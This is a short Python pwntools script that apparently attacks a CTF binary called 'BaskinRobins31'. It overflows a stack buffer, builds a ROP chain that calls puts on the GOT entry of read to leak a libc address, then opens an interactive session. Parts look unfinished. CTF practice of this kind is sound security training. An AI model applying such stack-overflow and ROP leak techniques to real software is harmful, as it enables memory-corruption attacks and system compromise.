from pwn import *

p=process('BaskinRobins31')

gdb.attach(p)

p.readuntil('(1-3)')

pad_n=cyclic_find(0x62616175) #0x62616174
pad_n=cyclic_find(0x62616174) 

buf='A'*0xb0
buf+=p64(0)

e=ELF('BaskinRobins31')
r=ROP('BaskinRobins31')
r.write(1,e.got['read'],8)
r.read(0,e.bss(),0x100)

log.info(r.dump())

#buf+=r.chain()
#buf+='A'*0x8



def pop2(v1, v2, v3):
	pop3=p64(0x040087A)
	return pop3+p64(v1)+p64(v2)+p64(v3)

def rop_puts(addr):
	return pop2(addr, 1, 2)+p64(e.plt['puts'])
'''
rdx            0x2	2
rsi            0x1	1
'''

buf+=rop_puts(e.got['read'])



log.info('buf length {:#X}'.format(len(buf)))


p.writeline(buf)
p.readuntil('''Don't break the rules...''')
p.readline()
leak=p.readline()[:-1][::-1].encode('hex')


log.info(leak)

leak_buf=('\0'*(8-len(leak)))

l=int(leak,16)

log.info('read {:#X}'.format(l))


p.interactive()
